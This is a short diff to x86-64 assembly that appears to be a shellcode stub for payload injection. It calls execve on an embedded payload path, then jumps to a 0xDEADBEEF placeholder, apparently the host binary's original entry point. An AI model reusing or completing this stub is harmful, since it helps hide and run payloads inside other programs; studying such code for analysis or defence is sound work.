@@ -4,7 +4,7 @@ BITS 64
 path:
 	pop rbx
 	mov r14, rdx
-	lea rdi, [rbx + 0x2d]
+    lea rdi, [rbx + 0x30]
 	push 0
 	push rdi
 	mov rsi, rsp
@@ -16,8 +16,10 @@ path:
 	mov al, 59
 	syscall
 parent:
-	add rsp, 0x10
-	mov rdx, r14
+	add rsp, 0x18
+	xor edi, edi
+	xor esi, esi
+	xor edx, edx
 	add rbx, 0xDEADBEEF
 	jmp rbx
 payload_path:
